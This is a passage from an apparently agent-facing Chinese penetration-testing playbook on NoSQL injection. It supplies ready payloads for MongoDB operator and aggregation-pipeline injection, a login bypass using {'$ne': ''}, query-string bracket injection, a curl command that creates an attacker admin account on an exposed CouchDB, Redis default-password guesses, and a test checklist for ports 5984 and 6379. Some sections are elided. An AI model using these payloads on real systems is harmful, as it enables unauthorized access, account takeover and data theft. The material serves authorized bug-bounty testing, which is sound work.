# nosql-injection
> **SRC / 众测语境** → 用 `read_reference(path: "src-hunter/playbooks/api-rest/10-rest-api.md")`（Mongo 操作符 + payloader/by-category/web/sql-nosql-injection.md）
...
- 完整 payload 表 + 自动化脚本 → 下文对应 REF 章节
...
> 融合自 yaklang/hack-skills `nosql-injection`，与上文去重后仅保留独有内容。操作符注入/登录绕过/`$regex` 盲注/`$where` 时间盲注见上文 Phase 1-2 与 REF: nosql-payloads；CouchDB Mango/design document 见 Phase 3.3。

## 聚合管道注入（Aggregation Pipeline）

用户可控数据进入 `$match` / `$group` 阶段时：

```javascript
// 漏洞代码:
db.collection.aggregate([ {$match: {category: userInput}}, ... ])
// userInput = {"$ne": null}  → 匹配全部分类
// userInput = {"$regex": ".*"} → 同上
```
...
Express/PHP 等把重复参数解析为数组；Node.js `qs` 库把括号语法解析成对象：

```
?filter[$ne]=invalid
→ filter = {$ne: "invalid"}   ← 直接变成操作符注入
```

## CouchDB 补充（创建管理员）

上文 Mango/design document 之外，匿名可写时直接建管理员：

```bash
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password"'
```

## Redis 注入（输入进入 Redis 查询时）
...
旧版 Redis 弱口令爆破：`AUTH 123456` / `AUTH redis` / `AUTH admin`。
...
表单端点换 `Content-Type: application/json` 再测一次：
...
| 语言 | SQL 语法 | 查询操作符对象 |
| 注入向量 | 字符串拼接 | 对象/操作符注入 |
| 典型信号 | 引号改变响应 | `{$ne:x}` 改变响应 |
| 数据提取 | UNION / 报错 | `$regex` 字符 oracle |
| 认证绕过 | `' OR 1=1--` | `{"password":{"$ne":""}}` |
| OS 命令 | xp_cmdshell (MSSQL) | 罕见（需 `$where` + CVE） |
| 指纹 | 各库报错文本 | `cannot use $` 类报错 |

`$where` 在服务端跑 JavaScript：除逻辑滥用和时间盲注外，老版本 MongoDB 无严格 V8 沙箱时有 RCE 风险 —— 任何 `$where` sink 都按高危处理。

## 测试清单

```text
□ 登录字段 JSON body 试 {"$ne": "invalid"}
□ URL 编码表单试 password[$ne]=invalid
□ Content-Type 换 application/json 复测
□ $regex 逐字符盲注（脚本见上文 REF）
□ $where 时间盲注（脚本见上文 REF）
□ 聚合管道 $match/$group 处试操作符
□ 5984 CouchDB 未授权 + Mango
□ 6379 Redis 未授权
```
